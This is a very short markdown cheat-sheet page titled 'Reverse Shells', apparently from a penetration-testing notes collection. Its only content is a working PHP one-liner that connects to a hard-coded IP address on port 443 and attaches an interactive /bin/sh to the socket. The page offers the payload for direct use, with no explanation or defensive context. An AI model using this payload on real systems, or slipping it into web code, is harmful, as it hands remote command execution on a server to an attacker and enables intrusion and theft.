---
description: reverse
---

# Reverse Shells

### PHP

```php
<?php $sock=fsockopen("10.11.0.53", 443); proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
```



